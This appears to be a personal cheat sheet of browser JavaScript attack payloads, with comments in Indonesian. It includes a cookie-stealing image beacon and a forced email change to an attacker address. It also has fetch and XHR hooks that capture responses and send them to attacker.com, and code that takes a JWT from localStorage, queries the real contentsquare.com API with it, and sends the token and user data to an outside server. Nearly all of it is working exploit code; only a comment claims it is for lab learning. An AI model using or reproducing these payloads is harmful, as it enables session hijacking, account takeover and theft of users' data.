fetch('https://webhook.site/k')

```js
new Image().src = "https://testing.aigoretech.cloud?cookie=" + document.cookie;
```

```js
fetch("/api/me").then(r=>r.text()).then(console.log)
```

```js
fetch("/my-account/update-email", {
  method: "POST",
  body: "email=attacker@mail.com",
  headers: {"Content-Type": "application/x-www-form-urlencoded"}
});
```


```js
fetch("/v2/auth/refresh ", {
  credentials: "include"
}).then(r => r.text()).then(console.log)
```


## Hook / intercept request
```js
(function() {
  const origFetch = window.fetch;
  window.fetch = async function(...args) {
    const res = await origFetch.apply(this, args);
    res.clone().text().then(t => {
      console.log("FETCH:", args, t);
    });
    return res;
  };
})();
```

## Hook XHR

```js
(function() {
  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(...args) {
    this.addEventListener("load", function() {
      console.log("XHR:", args, this.responseText);
    });
    return origOpen.apply(this, args);
  };
})();
```


```js
// Di lab sendiri, ini cara kerja "pencurian" secara teknis
// Perbaikan payload hook fetch + eksfiltrasi (hanya untuk pembelajaran)
const stolenData = [];
const origFetch = window.fetch;

window.fetch = async function(...args) {
  const res = await origFetch.apply(this, args);
  
  // Clone response agar bisa dibaca tanpa merusak response asli
  const clone = res.clone();
  
  clone.text().then(body => {
    stolenData.push({ url: args[0], body });
    console.log("Data tertangkap:", args[0], body);
    
    // === EKSFILTRASI (perbaikan) ===
    // Cara 1: Mengirim via Image (GET, terbatas panjang URL)
    // Kelemahan: data kepanjangan akan terpotong
    try {
      const img = new Image();
      img.src = 'https://attacker.com/steal?data=' + encodeURIComponent(body);
      // Catatan: img.src assignment sudah benar, tidak perlu 'new Image().src ='
    } catch(e) { console.warn("Gagal kirim via Image", e); }
    
    // Cara 2: Mengirim via fetch POST (lebih baik, tanpa batasan panjang)
    // Lebih stealth dan reliable
    fetch('https://attacker.com/steal', {
      method: 'POST',
      mode: 'no-cors', // agar tidak kena CORS block (tapi response tidak bisa dibaca)
      body: JSON.stringify({ url: args[0], data: body }),
      headers: { 'Content-Type': 'application/json' }
    }).catch(e => console.warn("Gagal kirim POST", e));
    
  }).catch(err => console.warn("Gagal baca response", err));
  
  return res;
};
```


ambil data dari local storage
```js
localStorage.getItem("uxa:jwt")
```


## Ambil Cookie dari localstorage

```js
// Ambil token dari localStorage
const token = localStorage.getItem('uxa:jwt');

// Fetch data user
fetch('https://webapi.contentsquare.com/v1/me', {
  method: 'GET',
  headers: {
    'Authorization': `Bearer ${token}`
  }
})
.then(res => res.json())
.then(data => {
  // Kirim data ke server attacker
  fetch('https://testing.aigoretech.cloud', {
    method: 'GET',
    mode: 'no-cors',
    body: JSON.stringify({
      token: token,
      userData: data
    })
  });
});
```


### Cara lihat hasilniay 

```js
(async () => {
  const res = await fetch("https://webapi.contentsquare.com/v1/me", {
    headers: { authorization: "Bearer " + localStorage.getItem("uxa:jwt") }
  });
  console.log(await res.json());
})();
```